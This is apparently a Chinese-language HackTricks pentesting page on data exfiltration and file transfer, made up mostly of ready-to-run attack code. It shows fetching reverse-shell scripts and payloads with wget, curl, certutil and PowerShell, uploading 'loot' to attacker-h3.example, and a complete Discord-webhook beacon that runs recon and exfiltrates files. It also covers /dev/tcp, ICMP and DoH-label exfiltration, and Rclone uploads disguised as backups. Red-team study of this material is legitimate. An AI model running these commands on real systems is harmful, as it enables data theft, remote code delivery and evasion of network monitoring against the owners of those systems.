# 数据外传

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> 如需端到端示例，了解如何将战利品暂存到 `C:\Users\Public`，并使用 Rclone 将其外传以伪装成常规备份，请查看以下工作流。

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## 常用于外传信息的白名单域名

访问 [https://lots-project.com/](https://lots-project.com/) 查找可能被滥用的常见白名单域名

## 复制粘贴 Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### 上传文件

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**打印 GET 和 POST 请求（以及 headers）的 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python 模块 [uploadserver](https://pypi.org/project/uploadserver/)：

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS 服务器**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

如果出口控制针对经典的 **TCP/443** 检查进行了调优，却对 **UDP/443** 的限制较宽松，强制使用 **HTTP/3** 可将传输切换到 **QUIC**，而非基于 TCP 的 TLS。攻击者端点需要原生支持 HTTP/3（例如，已通过 `Alt-Svc: h3` 声明支持 HTTP/3 的反向代理或上传端点）。

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

一篇 2025 年的研究论文（QUIC-Exfil）发现，QUIC 的加密标头和动态地址变更会让防火墙层面的外传检测比基于 TLS 或 DNS 的通道更困难，并演示了一种 server-preferred-address 方法，可将外传伪装成服务器端连接迁移。<sup>[[9]](#references)</sup>

### 预签名 / 委派的对象存储上传

如果你能生成或获取一个短期有效的**签名 URL**，受害主机只需要普通的 HTTPS 客户端。这样就无需在主机上安装云 SDK 或使用长期有效的凭据。<sup>[[8]](#references)</sup> 这种流量也可以混入常见的对象存储流量中。

**Linux / macOS（AWS S3 预签名 `PUT`）**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell（AWS S3 预签名 `PUT`）**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

备注：
- 预签名 URL / SAS token 通常会限定 **路径**、**HTTP 方法**和**过期时间**。<sup>[[8]](#references)[[10]](#references)</sup>
- 对于 Azure Blob `Put Blob`，`x-ms-blob-type: BlockBlob` 是必需的。<sup>[[10]](#references)</sup>
- 此模式适用于 `curl`、`Invoke-WebRequest`，或任何能够发送原始 HTTPS `PUT` 请求的自定义 implant。

### goshs

[goshs](https://github.com/patrickhener/goshs) 是 `python3 -m http.server` 的单二进制替代品。<sup>[[4]](#references)</sup>
它支持上传、下载、WebDAV、SFTP、SMB、TLS、身份验证、分享链接，以及 OOB 协作功能（DNS、SMTP、NTLM hash 捕获）。<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## 用于 C2 和数据外传的 Webhooks（Discord/Slack/Teams）

Webhooks 是只写 HTTPS 端点，接受 JSON 和可选的文件部分。它们通常被允许访问受信任的 SaaS 域名，且无需 OAuth/API 密钥，因此适用于低摩擦 beaconing 和数据外传。<sup>[[5]](#references)[[6]](#references)</sup>

关键要点：
- 端点：Discord 使用 https://discord.com/api/webhooks/<id>/<token>
- 使用 POST multipart/form-data，其中一个部分名为 payload_json，包含 {"content":"..."}，并可选包含名为 file 的文件部分。
- Operator 循环模式：定期 beacon -> 目录 recon -> 定向文件外传 -> recon dump -> sleep。HTTP 204 NoContent/200 OK 表示交付成功。

PowerShell PoC（Discord）：

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

备注：
- 类似模式也适用于其他协作平台（Slack/Teams）的 incoming webhooks；请相应调整 URL 和 JSON schema。
- 有关 Discord Desktop 缓存 artifacts 和 webhook/API 恢复的 DFIR，请参阅以下相关页面。<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## 将 Registry artifacts 用作回传通道

如果代码已在构建或文档 worker 中执行，并且能够通过身份验证访问 package registry，那么 registry 本身就可以用作回传通道。在 GemStuffer 示例中，一个 payload 使用获取到的响应文件构建了一个**新 gem**，并尝试通过 RubyGems 的 `/api/v1/gems` 推送；另一个则将获取到的响应写入 `README.md`，移除其 `.yardopts` loader，并尝试发布**同一 gem 的新版本**。这与安装时 hook 不同，并且需要有效的发布凭据和出站 registry 访问权限。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

另一种变体将 registry 的**webhook 配置用作存储**，而不是用作出站回调。它使用 zlib 压缩响应，再进行 URL-safe Base64 编码、移除填充，并将其拆分为编号的 URL segments，每段最多 220 个字符。拥有 webhook 管理权限的密钥可以通过 `POST /api/v1/web_hooks` 接受 `gem_name` 和 `url`；`GET /api/v1/web_hooks.json` 则会列出该账户保存的 URL。编号 segments 加上结束标记，让获得授权的读取者能够重建数据。示例中的 `example.com` 主机名只是保存值中的占位符，并不能证明存在可用的 C2 endpoint 或成功的数据传输。<sup>[[13]](#references)[[14]](#references)</sup>

```text
POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
```

对于初始的 [YARD `.yardopts` 执行路径](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds)，registry 通道只是执行后的可能性。必须单独观察到成功的 `POST` 或之后可读取的 artifact；引用的样例主要展示的是尝试发布和注册。<sup>[[12]](#references)[[13]](#references)</sup>

## Rclone（cloud/object-storage 数据外传）

现代操作者通常会**先在本地暂存 loot**，然后使用 [Rclone](https://rclone.org/) 让传输看起来像正常的备份或同步任务。一种实用模式是：

1. 一个普通的 remote（`s3`、`webdav`、`drive`、`mega` 等）
2. 一个 `crypt` wrapper，用于**在客户端加密内容和文件名**
3. 一个可选的 `chunker` wrapper，适用于 provider 限制对象大小，或你希望上传单元更小的情况

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

备注：
- `crypt` 可以加密文件内容和文件名。<sup>[[3]](#references)</sup>
- `chunker` 会透明地拆分大文件，并在下载时重新组装。<sup>[[11]](#references)</sup>
- `rclone.conf` 以**混淆**形式存储 `crypt` 密钥，不提供强静态数据保护。<sup>[[3]](#references)</sup> 对于短期操作，建议使用专用的临时配置，并在之后将其删除。如果必须保留更长时间，建议使用加密配置处理方式（`RCLONE_CONFIG_PASS` / `--password-command`），而不是将未加密的 `rclone.conf` 留在磁盘上。<sup>[[11]](#references)</sup>
- 如果目标已同步 **OneDrive**、**Google Drive** 或 **Dropbox**，将 loot 复制到同步目录中，就可以借助已获批准的客户端传输，而无需放置新的传输二进制文件。

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP 服务器（python）

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP 服务器 (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP 服务器 (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** 客户端

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali 作为服务器

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

或者**使用 samba**创建一个 smb 共享：

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) 是一个单二进制文件替代工具，可通过 SMB 提供文件，并捕获连接客户端的 NTLM 哈希。<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

攻击者必须运行 SSHd。

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

如果受害者有 SSH，攻击者可以将受害者上的目录挂载到攻击者一侧。

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### 从受害者下载文件

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### 将文件上传到受害者的设备

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

感谢 **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

如果经典的 UDP/53 DNS 流量过于显眼或遭到阻止，但出站 HTTPS 普遍允许，则可以将常见的 DNS-label exfiltration 模式封装在发往公共 resolver 的 **DoH** 请求中。每个 label 的长度应远低于 DNS 的 63 字节限制，并使用 Base32 等适用于 DNS 的字符集。

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

在 `exf.attacker.tld` 的权威 DNS server 上，按数字前缀对查询排序并重建 Base32 stream。这样，传输会通过 HTTPS 到达 resolver，而不是使用传统的 UDP/53 DNS。<sup>[[2]](#references)</sup>

有关完整的双向 DNS tunnel 工具（`iodine`、`dnscat2` 等），请查看[隧道页面](tunneling-and-port-forwarding.md)。

## **SMTP**

如果你可以向 SMTP server 发送数据，就可以用 python 创建一个 SMTP server 来接收数据：

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) 可以快速启动 SMTP 服务器，在 OOB 数据外传场景中捕获邮件回调。<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

收到的邮件和 callback 会直接显示在终端输出中。
可与 DNS callback server 结合使用，以实现完整的 OOB 覆盖：

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

在 XP 和 2003 中默认启用（其他系统需要在安装时显式添加）

在 Kali 中，**启动 TFTP server**：

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Python 中的 TFTP 服务器：**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

在 **victim** 中，连接到 Kali 服务器：

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

使用 PHP 单行命令下载文件：

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**受害者**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

`debug.exe` 程序不仅可以检查二进制文件，还具备**从十六进制数据重建二进制文件的能力**。这意味着，只要提供二进制文件的十六进制数据，`debug.exe` 就能生成该二进制文件。不过请注意，debug.exe **只能汇编最大 64 kb 的文件**。<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

然后将文本复制粘贴到 windows-shell 中，就会创建一个名为 nc.exe 的文件。

## References

- [1] [将文件传输到 Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` 后端](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord 作为 C2 以及遗留的缓存证据](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – 执行 Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord 取证套件（缓存解析器）](https://github.com/jwdfir/discord_cache_parser)
- [8] [使用预签名 URL 上传对象 - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil：利用 QUIC 的 Server Preferred Address 功能执行数据外传攻击](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob（REST API）- Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone 文档](https://rclone.org/docs/#configuration-encryption)
- [12] [RubyHack – RubyGems 和 RubyDoc 调查](https://www.rubyhack.ai/)
- [13] [JFrog 安全研究 – GemStuffer 分析](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
- [14] [RubyGems.org API – gem 和 webhook 方法](https://guides.rubygems.org/rubygems-org-api/)
{{#include ../banners/hacktricks-training.md}}
